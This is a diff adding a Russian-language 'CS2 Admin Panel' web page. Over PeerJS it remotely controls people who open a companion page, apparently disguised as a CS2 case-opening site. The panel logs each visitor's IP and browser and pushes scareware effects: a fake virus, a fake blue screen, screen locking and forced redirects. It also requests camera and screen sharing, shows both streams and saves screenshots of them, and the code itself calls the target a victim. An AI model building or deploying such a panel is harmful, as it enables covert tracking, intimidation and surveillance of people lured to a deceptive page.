@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>⚙️ Admin Panel</title>
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',sans-serif}
+body{background:linear-gradient(135deg,#0a0c12,#1a1f2e);color:#fff;min-height:100vh;padding:20px}
+.wrap{max-width:1300px;margin:0 auto;display:flex;flex-direction:column;gap:20px}
+h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.sub{color:#8892a6;font-size:14px}
+.status-line{display:flex;gap:12px;align-items:center;font-size:13px;color:#4ade80}
+.status-line .dot{width:10px;height:10px;border-radius:50%;background:#4ade80;box-shadow:0 0 10px #4ade80}
+.status-line .dot.off{background:#6b7280;box-shadow:none}
+.panel{background:linear-gradient(145deg,#181c24,#12161e);border:1px solid #262c38;border-radius:16px;padding:22px}
+.panel-title{font-size:14px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#8892a6;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center}
+.badge{background:#4ade80;color:#000;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:800}
+.badge.red{background:#eb4b4b;color:#fff}
+.sessions-list{display:flex;flex-direction:column;gap:10px}
+.session{display:grid;grid-template-columns:50px 1fr 160px 140px 120px;gap:14px;align-items:center;padding:14px 18px;background:#0d1117;border:2px solid #262c38;border-radius:12px;cursor:pointer;transition:all .2s}
+.session:hover{border-color:#7c3aed;transform:translateX(4px)}
+.session.active{border-color:#f0b90b;background:linear-gradient(135deg,rgba(240,185,11,.1),transparent);box-shadow:0 0 20px rgba(240,185,11,.3)}
+.session-idx{font-weight:900;font-size:20px;text-align:center;color:#7c3aed}
+.session-ip{font-family:'Courier New',monospace;font-size:14px;font-weight:700;color:#fff}
+.session-ua{font-size:11px;color:#8892a6;margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.session-time{font-size:12px;color:#8892a6;text-align:right}
+.session-time b{color:#4ade80;display:block;font-size:14px}
+.session-stats{font-size:12px;color:#8892a6;text-align:right}
+.session-stats b{color:#f0b90b;display:block;font-size:14px}
+.session-status{display:flex;align-items:center;gap:6px;font-size:12px}
+.status-dot{width:8px;height:8px;border-radius:50%;background:#4ade80;box-shadow:0 0 8px #4ade80}
+.status-dot.off{background:#6b7280;box-shadow:none}
+.empty{text-align:center;padding:40px;color:#8892a6}
+.empty b{display:block;color:#f0b90b;font-size:18px;margin-bottom:8px}
+.prank-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px}
+.prank-btn{padding:16px;border-radius:12px;border:2px solid #262c38;background:#0d1117;color:#fff;cursor:pointer;font-weight:700;font-size:14px;transition:all .2s;text-align:left;display:flex;flex-direction:column;gap:6px}
+.prank-btn:hover{border-color:#7c3aed;transform:translateY(-3px)}
+.prank-btn:disabled{opacity:.3;cursor:not-allowed;transform:none}
+.prank-btn .icon{font-size:28px}
+.prank-btn .desc{font-size:11px;color:#8892a6;font-weight:400}
+.prank-btn.danger{border-color:#eb4b4b}
+.prank-btn.gold{border-color:#f0b90b}
+.selected-info{padding:14px 18px;background:linear-gradient(135deg,rgba(240,185,11,.1),transparent);border:2px solid #f0b90b;border-radius:12px;margin-bottom:16px;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.selected-info .label{font-size:12px;color:#8892a6;text-transform:uppercase}
+.selected-info .value{font-size:16px;font-weight:700;color:#f0b90b;font-family:'Courier New',monospace}
+.no-selection{padding:20px;text-align:center;color:#8892a6;background:#0d1117;border:2px dashed #262c38;border-radius:12px;margin-bottom:16px}
+.log{max-height:300px;overflow-y:auto;font-family:'Courier New',monospace;font-size:12px;background:#0d1117;padding:16px;border-radius:12px;border:1px solid #262c38}
+.log-entry{padding:4px 0;border-bottom:1px solid #1a1f2e}
+.log-entry .time{color:#6b7280;margin-right:8px}
+.log-entry.info{color:#4ade80}
+.log-entry.warn{color:#f0b90b}
+.log-entry.err{color:#eb4b4b}
+.video-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:16px}
+.video-box{background:#000;border:2px solid #262c38;border-radius:12px;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
+.video-box video{width:100%;height:100%;object-fit:contain}
+.video-box .label{position:absolute;top:8px;left:8px;background:rgba(0,0,0,.7);padding:4px 8px;border-radius:4px;font-size:11px;font-weight:700}
+.video-box .empty{color:#6b7280;font-size:13px}
+.btn-screenshot{position:absolute;bottom:8px;right:8px;background:#7c3aed;color:#fff;border:0;padding:6px 12px;border-radius:6px;cursor:pointer;font-weight:700;font-size:11px}
+
+/* MP3 */
+.drop-zone{border:2px dashed #262c38;border-radius:12px;padding:24px;text-align:center;cursor:pointer;transition:.2s;background:rgba(13,17,23,.5);margin-bottom:12px}
+.drop-zone:hover,.drop-zone.dragover{border-color:#f0b90b;background:rgba(240,185,11,.05)}
+.drop-zone-icon{font-size:42px;margin-bottom:8px}
+.drop-zone-text{font-size:14px;color:#8892a6;font-weight:600}
+.drop-zone-text b{color:#f0b90b}
+.drop-zone-hint{font-size:11px;color:#6b7280;margin-top:6px}
+.mp3-player{background:#0d1117;border:2px solid #262c38;border-radius:12px;padding:16px;margin-bottom:12px}
+.mp3-info{margin-bottom:12px}
+.mp3-title{font-size:16px;font-weight:700;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.mp3-sub{font-size:12px;color:#8892a6;margin-top:2px}
+.mp3-controls{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
+.mp3-btn{background:#181c24;color:#fff;border:2px solid #262c38;border-radius:10px;padding:10px 16px;font-weight:700;font-size:14px;cursor:pointer;transition:.2s;min-width:48px}
+.mp3-btn:hover{border-color:#7c3aed;transform:translateY(-2px)}
+.mp3-btn.gold{border-color:#f0b90b;background:linear-gradient(135deg,rgba(240,185,11,.15),transparent);color:#f0b90b}
+.mp3-btn.gold:hover{background:linear-gradient(135deg,#f0b90b,#d99f00);color:#000}
+.mp3-btn.danger{border-color:#eb4b4b;color:#eb4b4b}
+#mp3Seek{width:100%;accent-color:#f0b90b;cursor:pointer}
+.mp3-time{display:flex;justify-content:space-between;font-size:11px;color:#8892a6;margin-top:4px;font-family:'Courier New',monospace}
+.playlist{max-height:220px;overflow-y:auto;background:#0d1117;border-radius:10px;border:1px solid #262c38;margin-top:10px}
+.playlist-item{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;border-bottom:1px solid #1a1f2e;cursor:pointer;transition:.15s;font-size:13px}
+.playlist-item:last-child{border-bottom:none}
+.playlist-item:hover{background:rgba(124,58,237,.1)}
+.playlist-item.active{background:linear-gradient(135deg,rgba(240,185,11,.15),transparent);border-left:3px solid #f0b90b}
+.playlist-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-right:10px}
+.playlist-actions{display:flex;gap:6px;flex-shrink:0}
+.playlist-actions button{background:transparent;border:1px solid #262c38;color:#8892a6;border-radius:6px;padding:4px 8px;font-size:11px;cursor:pointer}
+.playlist-actions button:hover{border-color:#f0b90b;color:#f0b90b}
+.url-row{display:flex;gap:8px;margin-bottom:10px}
+.url-row input{flex:1;padding:12px;border-radius:10px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:14px;outline:none}
+.url-row input:focus{border-color:#7c3aed}
+@media(max-width:720px){.session{grid-template-columns:40px 1fr}.session-time,.session-stats,.session-status{display:none}.video-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div>
+    <h1>⚙️ CS2 Admin Panel</h1>
+    <div class="sub">Подключение через PeerJS. Открой этот файл первым, потом жди друга.</div>
+    <div class="status-line" style="margin-top:10px"><div class="dot" id="peerDot"></div><span id="peerStatus">Запуск PeerJS...</span></div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>👥 Сессии</span><span class="badge" id="sessionCount">0</span></div>
+    <div class="sessions-list" id="sessionsList">
+      <div class="empty"><b>Пока никого</b>Друг должен зайти на case.html по ссылке</div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>🎯 Выбранная сессия</span></div>
+    <div id="selectedInfo" class="no-selection">Выбери сессию</div>
+
+    <div class="panel-title" style="margin-top:20px"><span>😈 Основные пранки</span></div>
+    <div class="prank-grid">
+      <button class="prank-btn danger" data-prank="screamer"><div class="icon">😱</div><div>Скример</div><div class="desc">Звук + вспышка + тряска</div></button>
+      <button class="prank-btn danger" data-prank="shake"><div class="icon">📳</div><div>Тряска</div><div class="desc">3 сек</div></button>
+      <button class="prank-btn danger" data-prank="earthquake"><div class="icon">🌋</div><div>Землетрясение</div><div class="desc">10 сек</div></button>
+      <button class="prank-btn danger" data-prank="fakeVirus"><div class="icon">🦠</div><div>Фейк-вирус</div></button>
+      <button class="prank-btn danger" data-prank="bsod"><div class="icon">💀</div><div>Синий экран</div></button>
+      <button class="prank-btn danger" data-prank="blockScreen"><div class="icon">🔒</div><div>Заблокировать</div><div class="desc">Экран во весь размер</div></button>
+      <button class="prank-btn gold" data-prank="stop"><div class="icon">🛑</div><div>СТОП всё</div></button>
+    </div>
+
+    <div class="panel-title" style="margin-top:20px"><span>🎨 Визуальные эффекты</span></div>
+    <div class="prank-grid">
+      <button class="prank-btn" data-prank="invert"><div class="icon">🎨</div><div>Инверсия</div><div class="desc">5 сек</div></button>
+      <button class="prank-btn" data-prank="blur"><div class="icon">🌫️</div><div>Размытие</div><div class="desc">5 сек</div></button>
+      <button class="prank-btn" data-prank="hue"><div class="icon">🌈</div><div>Сдвиг цвета</div></button>
+      <button class="prank-btn" data-prank="bigCursor"><div class="icon">👆</div><div>Огромный курсор</div></button>
+      <button class="prank-btn" data-prank="longShake"><div class="icon">📳</div><div>Тряска 10 сек</div></button>
+      <button class="prank-btn" data-prank="longInvert"><div class="icon">🎨</div><div>Инверсия 30 сек</div></button>
+      <button class="prank-btn" data-prank="longBlur"><div class="icon">🌫️</div><div>Блюр 30 сек</div></button>
+    </div>
+
+    <div class="panel-title" style="margin-top:20px"><span>🌐 Действия</span></div>
+    <div class="prank-grid">
+      <button class="prank-btn" data-prank="reload"><div class="icon">🔄</div><div>Перезагрузить</div><div class="desc">Обновить страницу друга</div></button>
+      <button class="prank-btn" data-prank="requestCam"><div class="icon">📸</div><div>Запросить камеру</div></button>
+      <button class="prank-btn" data-prank="requestNotif"><div class="icon">🔔</div><div>Запросить уведомления</div></button>
+      <button class="prank-btn danger" data-prank="clearInventory"><div class="icon">🗑️</div><div>Очистить инвентарь</div></button>
+      <button class="prank-btn danger" data-prank="resetStats"><div class="icon">📊</div><div>Сбросить статистику</div></button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>💬 Модальное окно у друга</span></div>
+    <div class="url-row">
+      <input id="modalTitle" type="text" value="Сообщение" placeholder="Заголовок">
+    </div>
+    <div class="url-row">
+      <input id="modalText" type="text" value="Привет от администратора!" placeholder="Текст">
+      <button class="mp3-btn gold" id="modalBtn">Показать</button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>💬 Кастомный alert</span></div>
+    <div class="url-row">
+      <input id="alertText" type="text" value="ПРИВЕТ ОТ ХАКЕРА">
+      <button class="mp3-btn gold" id="alertBtn">Отправить</button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>🌐 Открыть URL / Редирект</span></div>
+    <div class="url-row">
+      <input id="redirectUrl" type="text" placeholder="https://..." value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+      <button class="mp3-btn gold" id="redirectBtn">Редирект</button>
+      <button class="mp3-btn" id="openUrlBtn">Новая вкладка</button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>🎭 Имя друга</span></div>
+    <div class="url-row">
+      <input id="nameInput" type="text" value="LOL" placeholder="Новое имя">
+      <button class="mp3-btn gold" id="nameBtn">Установить</button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title">
+      <span>🎵 MP3-плеер</span>
+      <span class="badge" id="trackCount">0 треков</span>
+    </div>
+
+    <div class="drop-zone" id="dropZone">
+      <div class="drop-zone-icon">🎵</div>
+      <div class="drop-zone-text">Перетащи <b>MP3</b> сюда или <b>кликни</b></div>
+      <div class="drop-zone-hint">mp3, wav, ogg, m4a · до 8 МБ</div>
+      <input type="file" id="fileInput" accept="audio/*" multiple style="display:none">
+    </div>
+
+    <div class="url-row">
+      <input id="mp3Url" type="text" placeholder="Или URL на MP3...">
+      <button class="mp3-btn" id="addUrlBtn">+ URL</button>
+    </div>
+
+    <div class="mp3-player">
+      <div class="mp3-info">
+        <div class="mp3-title" id="mp3Title">— трек не выбран —</div>
+        <div class="mp3-sub" id="mp3Sub">Загрузи mp3 или выбери из плейлиста</div>
+      </div>
+      <div class="mp3-controls">
+        <button class="mp3-btn" id="mp3Play">▶</button>
+        <button class="mp3-btn" id="mp3Pause">⏸</button>
+        <button class="mp3-btn" id="mp3Stop">⏹</button>
+        <button class="mp3-btn gold" id="mp3Send">📤 В эфир</button>
+        <button class="mp3-btn danger" id="mp3Remove">🗑</button>
+      </div>
+      <input type="range" id="mp3Seek" min="0" max="100" value="0">
+      <div class="mp3-time"><span id="mp3Time">0:00</span><span id="mp3Dur">0:00</span></div>
+      <audio id="mp3Audio" style="display:none"></audio>
+    </div>
+
+    <div class="playlist" id="playlist">
+      <div class="empty" style="padding:20px;font-size:12px">Плейлист пуст</div>
+    </div>
+
+    <div style="margin-top:14px">
+      <div style="font-size:12px;color:#8892a6;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px">🚀 Быстрые звуки</div>
+      <div class="prank-grid">
+        <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/knock-on-door.mp3">🚪 Стук</button>
+        <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/heavy_breathing.mp3">👤 Дыхание</button>
+        <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/fnaf-x-scott.mp3">🐻 FNAF</button>
+        <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/vine-boom.mp3">💥 Vine Boom</button>
+        <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/wilhelm-scream.mp3">😱 Wilhelm</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>💰 Баланс</span></div>
+    <div class="url-row">
+      <input id="balanceAmount" type="number" value="1000">
+      <button class="mp3-btn gold" id="setBalanceBtn">Установить</button>
+      <button class="mp3-btn" id="addBalanceBtn">Прибавить</button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>📹 Видео с устройства друга</span><span class="badge red" id="camCount">0</span></div>
+    <div class="video-grid">
+      <div class="video-box" id="camBox1"><div class="empty">Камера (друг должен разрешить)</div></div>
+      <div class="video-box" id="camBox2"><div class="empty">Экран (друг должен разрешить)</div></div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>📜 Лог</span></div>
+    <div class="log" id="log"></div>
+  </div>
+</div>
+
+<script>
+const ADMIN_PEER_ID = 'CS2_ADMIN_X7K9QW2';
+const peer = new Peer(ADMIN_PEER_ID);
+let conns = new Map();
+let selectedIp = null;
+let camCount = 0;
+const connIp = new WeakMap();
+
+function log(msg, type='info') {
+    const l = document.getElementById('log');
+    const t = new Date().toLocaleTimeString('ru-RU');
+    const d = document.createElement('div');
+    d.className = 'log-entry ' + type;
+    d.innerHTML = `<span class="time">${t}</span>${msg}`;
+    l.prepend(d);
+    if (l.children.length > 200) l.lastChild.remove();
+}
+
+peer.on('open', (id) => {
+    document.getElementById('peerStatus').textContent = 'PeerJS подключён · ID: ' + id;
+    log(`✅ PeerJS готов. Твой ID: ${id}`, 'info');
+});
+peer.on('error', (err) => {
+    log(`❌ PeerJS ошибка: ${err.type}`, 'err');
+    document.getElementById('peerStatus').textContent = 'Ошибка: ' + err.type;
+    document.getElementById('peerDot').classList.add('off');
+});
+peer.on('connection', (conn) => {
+    log(`🔌 Новое подключение`, 'warn');
+    conn.on('data', (data) => handleData(data, conn));
+    conn.on('close', () => {
+        if (connIp.get(conn)) {
+            log(`🔴 Отключился: ${connIp.get(conn)}`, 'warn');
+            conns.delete(connIp.get(conn));
+            renderSessions();
+        }
+    });
+});
+peer.on('call', (call) => {
+    call.answer();
+    log(`📹 Входящий видеозвонок`, 'info');
+    call.on('stream', (stream) => {
+        camCount++;
+        document.getElementById('camCount').textContent = camCount;
+        const box = document.getElementById('camBox' + (camCount === 1 ? '1' : '2'));
+        if (!box) return;
+        box.innerHTML = `<video autoplay muted playsinline></video><div class="label">${camCount === 1 ? '📸 КАМЕРА' : '🖥 ЭКРАН'}</div><button class="btn-screenshot" onclick="screenshot(this)">📸</button>`;
+        const v = box.querySelector('video');
+        v.srcObject = stream;
+        v.play().catch(() => { v.muted = true; v.play(); });
+        log(`📹 Видео #${camCount}`, 'warn');
+    });
+});
+
+function screenshot(btn) {
+    const v = btn.parentElement.querySelector('video');
+    const c = document.createElement('canvas');
+    c.width = v.videoWidth; c.height = v.videoHeight;
+    c.getContext('2d').drawImage(v, 0, 0);
+    const a = document.createElement('a');
+    a.download = 'screenshot_' + Date.now() + '.png';
+    a.href = c.toDataURL();
+    a.click();
+}
+
+function handleData(data, conn) {
+    if (!data || !data.type) return;
+    if (data.type === 'hello') {
+        connIp.set(conn, data.ip);
+        conns.set(data.ip, { conn, ip: data.ip, ua: data.ua, balance: data.balance, drops: data.drops, joinedAt: data.ts, lastSeen: Date.now() });
+        log(`🟢 Подключился: ${data.ip}`, 'info');
+        renderSessions();
+    } else if (data.type === 'heartbeat') {
+        const s = conns.get(data.ip);
+        if (s) { s.lastSeen = Date.now(); s.balance = data.balance; s.drops = data.drops; renderSessions(); }
+    } else if (data.type === 'drop') {
+        log(`🎁 Дроп: ${data.skin.name} (${data.skin.price}$) от ${connIp.get(conn) || '?'}`, 'warn');
+    } else if (data.type === 'deposit') {
+        log(`💳 Пополнение $${data.amount} от ${connIp.get(conn) || '?'}`, 'info');
+    } else if (data.type === 'upgradeWin') {
+        log(`✅ Апгрейд выигран: ${data.your.name} → ${data.target.name}`, 'info');
+    } else if (data.type === 'upgradeLose') {
+        log(`❌ Апгрейд проигран: ${data.your.name}`, 'err');
+    } else if (data.type === 'cameraOn') {
+        log(`📸 Друг разрешил камеру`, 'warn');
+    }
+}
+
+function renderSessions() {
+    const list = document.getElementById('sessionsList');
+    document.getElementById('sessionCount').textContent = conns.size;
+    if (!conns.size) {
+        list.innerHTML = '<div class="empty"><b>Пока никого</b>Друг должен зайти на case.html</div>';
+        return;
+    }
+    const arr = [...conns.values()].sort((a, b) => b.lastSeen - a.lastSeen);
+    list.innerHTML = '';
+    arr.forEach((s, i) => {
+        const online = Date.now() - s.lastSeen < 15000;
+        const ago = Math.floor((Date.now() - s.joinedAt) / 1000);
+        const agoT = ago < 60 ? ago + ' сек' : Math.floor(ago/60) + ' мин';
+        const d = document.createElement('div');
+        d.className = 'session' + (selectedIp === s.ip ? ' active' : '');
+        d.innerHTML = `
+            <div class="session-idx">#${i+1}</div>
+            <div><div class="session-ip">${s.ip}</div><div class="session-ua">${(s.ua||'').slice(0,80)}</div></div>
+            <div class="session-time"><b>${agoT}</b>зашёл</div>
+            <div class="session-stats"><b>${s.drops}</b>дропов · $${(s.balance||0).toFixed(0)}</div>
+            <div class="session-status"><div class="status-dot ${online?'':'off'}"></div>${online?'онлайн':'офлайн'}</div>
+        `;
+        d.onclick = () => selectSession(s.ip);
+        list.appendChild(d);
+    });
+}
+
+function selectSession(ip) {
+    selectedIp = ip;
+    const s = conns.get(ip);
+    const info = document.getElementById('selectedInfo');
+    if (s) {
+        info.className = 'selected-info';
+        info.innerHTML = `
+            <div><div class="label">IP</div><div class="value">${s.ip}</div></div>
+            <div><div class="label">Баланс</div><div class="value">$${(s.balance||0).toFixed(2)}</div></div>
+            <div><div class="label">Дропов</div><div class="value">${s.drops}</div></div>
+        `;
+    }
+    renderSessions();
+    log(`🎯 Выбрана сессия: ${ip}`, 'warn');
+}
+
+function sendPrank(action, extra = {}) {
+    if (!selectedIp) { alert('Выбери сессию'); return; }
+    const s = conns.get(selectedIp);
+    if (!s || !s.conn || !s.conn.open) { alert('Сессия офлайн'); return; }
+    s.conn.send({ action, ...extra });
+    log(`😈 → ${action} → ${selectedIp}`, 'warn');
+}
+
+document.querySelectorAll('.prank-btn[data-prank]').forEach(b => b.addEventListener('click', () => sendPrank(b.dataset.prank)));
+document.querySelectorAll('.prank-btn[data-sound]').forEach(b => b.addEventListener('click', () => sendPrank('playSound', {url: b.dataset.sound})));
+
+document.getElementById('alertBtn').onclick = () => sendPrank('alert', {text: document.getElementById('alertText').value});
+document.getElementById('modalBtn').onclick = () => sendPrank('showModal', {title: document.getElementById('modalTitle').value, text: document.getElementById('modalText').value});
+document.getElementById('redirectBtn').onclick = () => sendPrank('redirect', {url: document.getElementById('redirectUrl').value});
+document.getElementById('openUrlBtn').onclick = () => sendPrank('openUrl', {url: document.getElementById('redirectUrl').value});
+document.getElementById('nameBtn').onclick = () => sendPrank('setName', {name: document.getElementById('nameInput').value});
+document.getElementById('setBalanceBtn').onclick = () => sendPrank('setBalance', {value: Number(document.getElementById('balanceAmount').value)});
+document.getElementById('addBalanceBtn').onclick = () => sendPrank('addBalance', {value: Number(document.getElementById('balanceAmount').value)});
+
+/* ===== MP3 ПЛЕЕР ===== */
+const tracks = [];
+let currentIdx = -1;
+const audio = document.getElementById('mp3Audio');
+const dropZone = document.getElementById('dropZone');
+const fileInput = document.getElementById('fileInput');
+const playlist = document.getElementById('playlist');
+
+dropZone.onclick = () => fileInput.click();
+fileInput.onchange = (e) => { handleFiles(e.target.files); fileInput.value = ''; };
+dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.classList.add('dragover'); });
+dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
+dropZone.addEventListener('drop', (e) => { e.preventDefault(); dropZone.classList.remove('dragover'); handleFiles(e.dataTransfer.files); });
+document.addEventListener('dragover', (e) => e.preventDefault());
+document.addEventListener('drop', (e) => { if (!dropZone.contains(e.target)) { e.preventDefault(); handleFiles(e.dataTransfer.files); } });
+
+function handleFiles(files) {
+    let added = 0;
+    for (const f of files) {
+        if (!f.type.startsWith('audio/')) continue;
+        tracks.push({name: f.name, url: URL.createObjectURL(f), file: f});
+        added++;
+    }
+    if (added) { log(`🎵 Загружено ${added} треков`, 'info'); renderPlaylist(); if (currentIdx === -1 && tracks.length) selectTrack(0); }
+}
+
+document.getElementById('addUrlBtn').onclick = () => {
+    const url = document.getElementById('mp3Url').value.trim();
+    if (!url) return;
+    const name = url.split('/').pop().split('?')[0] || 'Трек по URL';
+    tracks.push({name, url, file: null});
+    document.getElementById('mp3Url').value = '';
+    log(`🎵 URL: ${name}`, 'info');
+    renderPlaylist();
+    if (currentIdx === -1) selectTrack(0);
+};
+
+function renderPlaylist() {
+    document.getElementById('trackCount').textContent = tracks.length + ' треков';
+    if (!tracks.length) { playlist.innerHTML = '<div class="empty" style="padding:20px;font-size:12px">Плейлист пуст</div>'; return; }
+    playlist.innerHTML = '';
+    tracks.forEach((t, i) => {
+        const d = document.createElement('div');
+        d.className = 'playlist-item' + (i === currentIdx ? ' active' : '');
+        d.innerHTML = `<div class="playlist-name">🎵 ${t.name}</div><div class="playlist-actions"><button data-act="play" data-idx="${i}">▶</button><button data-act="send" data-idx="${i}">📤</button><button data-act="del" data-idx="${i}">🗑</button></div>`;
+        d.onclick = (e) => { if (e.target.tagName === 'BUTTON') return; selectTrack(i); };
+        d.querySelector('[data-act="play"]').onclick = (e) => { e.stopPropagation(); selectTrack(i); playLocal(); };
+        d.querySelector('[data-act="send"]').onclick = (e) => { e.stopPropagation(); sendTrackToVictim(i); };
+        d.querySelector('[data-act="del"]').onclick = (e) => { e.stopPropagation(); removeTrack(i); };
+        playlist.appendChild(d);
+    });
+}
+function selectTrack(i) {
+    currentIdx = i;
+    const t = tracks[i];
+    document.getElementById('mp3Title').textContent = t.name;
+    document.getElementById('mp3Sub').textContent = t.file ? 'Локальный файл' : 'URL-источник';
+    audio.src = t.url;
+    audio.load();
+    renderPlaylist();
+}
+function removeTrack(i) {
+    const t = tracks[i];
+    if (t.file) URL.revokeObjectURL(t.url);
+    tracks.splice(i, 1);
+    if (currentIdx === i) { currentIdx = -1; audio.src = ''; document.getElementById('mp3Title').textContent = '— трек не выбран —'; }
+    else if (currentIdx > i) currentIdx--;
+    renderPlaylist();
+}
+function playLocal() { if (currentIdx === -1) return; audio.play().catch(()=>{}); }
+audio.addEventListener('timeupdate', () => {
+    if (!audio.duration) return;
+    const p = (audio.currentTime / audio.duration) * 100;
+    document.getElementById('mp3Seek').value = p;
+    document.getElementById('mp3Time').textContent = fmtTime(audio.currentTime);
+    document.getElementById('mp3Dur').textContent = fmtTime(audio.duration);
+});
+function fmtTime(s) { if (!isFinite(s)) return '0:00'; const m = Math.floor(s/60), sec = Math.floor(s%60); return m + ':' + (sec<10?'0':'') + sec; }
+document.getElementById('mp3Seek').oninput = (e) => { if (!audio.duration) return; audio.currentTime = (e.target.value / 100) * audio.duration; };
+document.getElementById('mp3Play').onclick = playLocal;
+document.getElementById('mp3Pause').onclick = () => audio.pause();
+document.getElementById('mp3Stop').onclick = () => { audio.pause(); audio.currentTime = 0; document.getElementById('mp3Seek').value = 0; document.getElementById('mp3Time').textContent = '0:00'; };
+document.getElementById('mp3Remove').onclick = () => { if (currentIdx !== -1) removeTrack(currentIdx); };
+document.getElementById('mp3Send').onclick = () => { if (currentIdx !== -1) sendTrackToVictim(currentIdx); };
+
+async function sendTrackToVictim(idx) {
+    if (!selectedIp) { alert('Выбери сессию'); return; }
+    const s = conns.get(selectedIp);
+    if (!s || !s.conn || !s.conn.open) { alert('Сессия офлайн'); return; }
+    const t = tracks[idx];
+    log(`🎵 Отправка "${t.name}" → ${selectedIp}...`, 'warn');
+    if (!t.file && !t.url.startsWith('blob:')) { s.conn.send({action: 'playSound', url: t.url}); log(`✅ URL отправлен`, 'info'); return; }
+    try {
+        const blob = t.file || await (await fetch(t.url)).blob();
+        if (blob.size > 8 * 1024 * 1024) { log(`❌ Файл > 8 МБ`, 'err'); alert('Файл больше 8 МБ'); return; }
+        const reader = new FileReader();
+        reader.onload = () => {
+            s.conn.send({action: 'playMp3', dataUrl: reader.result, name: t.name});
+            log(`✅ Отправлен mp3: ${t.name} (${(blob.size/1024).toFixed(0)} КБ)`, 'info');
+        };
+        reader.readAsDataURL(blob);
+    } catch(e) { log(`❌ Ошибка: ${e.message}`, 'err'); }
+}
+
+setInterval(renderSessions, 2000);
+log('⚙️ Админка запущена', 'info');
+</script>
+</body>
+</html>
